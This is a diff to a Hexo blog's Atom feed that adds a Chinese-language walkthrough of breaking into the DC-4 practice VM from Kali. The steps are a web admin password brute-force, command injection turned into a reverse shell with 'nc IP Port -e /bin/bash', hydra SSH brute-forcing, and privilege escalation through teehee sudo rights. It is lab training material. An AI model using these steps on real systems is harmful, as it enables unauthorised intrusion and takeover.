@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-12-15T13:29:31.096Z</updated>
+  <updated>2021-12-16T13:57:19.872Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>记录一次靶机渗透</title>
+    <link href="http://example.com/2021/12/16/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
+    <id>http://example.com/2021/12/16/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</id>
+    <published>2021-12-16T13:00:58.000Z</published>
+    <updated>2021-12-16T13:57:19.872Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="记录一次靶机渗透"><a href="#记录一次靶机渗透" class="headerlink" title="记录一次靶机渗透"></a>记录一次靶机渗透</h3><ol><li><strong>环境</strong>：DC-4靶机，Kali</li><li>注：因我的IP不可自动获取，如有做渗透时，IP获取不到时，可以使用我这个办法。</li><li>配置虚拟网络设置，将你的其中一张虚拟网卡设置为主机模式，IP自己设置<br><img src="/images/vm1.png"></li><li>两台主机都设置为同一张网卡，dhcp自动获取即可。<br><img src="/images/vm2.jpg"></li><li>分配完成后，进行主机发现，按你设置的IP来进行探测，找到主机就可以接下来的靶机渗透了<br><img src="/images/vm3.png"></li></ol><h3 id="一、对目标主机进行信息收集"><a href="#一、对目标主机进行信息收集" class="headerlink" title="一、对目标主机进行信息收集"></a>一、对目标主机进行信息收集</h3><ol><li>使用nmap进行一个综合扫描，查看靶机存在什么服务<br><img src="/images/vm4.png"></li></ol><h3 id="二、针对服务渗透进行提权"><a href="#二、针对服务渗透进行提权" class="headerlink" title="二、针对服务渗透进行提权"></a>二、针对服务渗透进行提权</h3><ol><li><p>存在ssh，因靶机账号密码未知，进行用户和密码一起爆破是比较愚蠢的办法，所以我们一般渗透都优先看web服务存在什么页面进行下手<br><img src="/images/DC1.png"></p></li><li><p>直接访问web发现存在一个管理员登录页面，我们可以进行密码爆破，一般只要是管理员界面，用户名基本都是admin，所以我们就直接输入admin，密码随便，接着抓取包进行密码爆破</p><p><img src="/images/DC15.png"><br><img src="/images/DC18.png"></p></li><li><p>成功爆破密码，密码为happy，直接admin和happy登录<br><img src="/images/DC3.png"></p></li><li><p>登录之后里面是一个运行命令框，我们随便选择一个运行，发现这是一个远程的shell<br><img src="/images/DC17.png"></p></li><li><p>我们通过抓包一下运行后的数据，发现是没有过滤直接写命令的，我们直接发送到重发器，然后把提交的ls -l命令修改成nc IP Port -e /bin/bash，本地开启nc监听，点一下Send发送，获取到www-data<br><img src="/images/DC4.png"></p></li><li><p>查看home目录下存在什么用户，经过一个一个查找，发现jim用户存在bak备份文件，将他下到本地<br><img src="/images/DC5.png"></p></li><li><p>cat一下备份文件，是一个密码字典，因是在jim里面发现的，又有ssh服务，所以我们利用hydra进行一个ssh爆破<br><img src="/images/DC6.png"><br><img src="/images/DC7.png"></p></li><li><p>爆破成功密码，我们利用ssh进行登录，成功远程登录到jim用户<br><img src="/images/DC8.png"></p></li><li><p>找几个常见会藏文件的地方，在var文件夹里发现一个mail文件夹，进入之后发现存在一个jim，cat一下发现是一个邮件，里面存在账户和密码<br><img src="/images/DC9.png"><br><img src="/images/DC10.png"></p></li><li><p>切换到charles用户，查看sudo -l权限，发现可以利用teehee提权<br><img src="/images/DC11.png"><br><img src="/images/DC12.png"></p></li><li><p>利用teehee写DC用户到root组里，成功提权，渗透结束<br><img src="/images/DC13.png"></p></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;记录一次靶机渗透&quot;&gt;&lt;a href=&quot;#记录一次靶机渗透&quot; class=&quot;headerlink&quot; title=&quot;记录一次靶机渗透&quot;&gt;&lt;/a&gt;记录一次靶机渗透&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;环境&lt;/strong&gt;：DC-4靶机，Kali&lt;/li&gt;
+&lt;li</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="靶机渗透" scheme="http://example.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>hydra爆破密码</title>
